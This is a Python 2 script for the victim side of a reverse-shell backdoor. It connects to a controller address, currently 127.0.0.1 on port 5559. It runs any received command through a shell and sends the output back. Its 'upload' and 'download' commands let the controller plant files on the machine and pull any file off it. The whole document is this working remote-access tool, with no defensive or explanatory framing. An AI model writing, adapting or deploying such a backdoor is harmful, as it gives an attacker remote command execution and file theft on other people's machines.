#!/usr/bin/python
#-*- coding:utf-8 -*-

import socket
import subprocess
import os

host = "127.0.0.1"
port = 5559
RECV_SIZE = 2048

def connect(host,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    while True:
        command = s.recv(RECV_SIZE).decode()
        if "exit" in command:
            s.send('ACK')
            s.close()
            break 

        elif "upload" in command:
            filename = command.split()[1]
            recvUploadFile(s,filename)

        elif "download" in command:
            filepath = command.split()[1]
            sendDownloadFile(s,filepath)
            
        else:
            print command
            CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())
   
def recvUploadFile(socket,filename):
    '''
    Receive file from controller.
    @filename : the file to be uploaded to current path.
    '''


    '''
    If the size of uploading file is bigger than RECV_SIZE
    recv it until to the end.
    '''
    recv_len = 1
    filedata = ''
    while recv_len:
        buff = socket.recv(RECV_SIZE)
        recv_len = len(buff)
        filedata = filedata + buff
        if recv_len < RECV_SIZE:
            break
    
    '''
    Prevent to cover the exist file.
    If there is existing same namw file, rename the upload file.
    '''
    i=1
    tmpname = filename
    while os.path.exists(tmpname):
        name = filename.split('.')
        name[0] += str(i)
        filename = '.'.join(name)
        tmpname = filename
        i += 1

    file = open(filename,"w")
    file.write(filedata)
    file.close()
    socket.send("upload file success!")


def sendDownloadFile(socket,filepath):
    '''
    To send file to controller.
    @filepath: the file of this host

    '''
    if not os.path.exists(filepath):
        socket.send("File is not exist")
    else:
        file = open(filepath)
        data_len = 1
        while data_len:
            data = file.read(RECV_SIZE)
            data_len = len(data)
            socket.send(data)
            if data_len < RECV_SIZE:
                break

def main():
    connect(host,port)
if __name__ == '__main__':
    main()
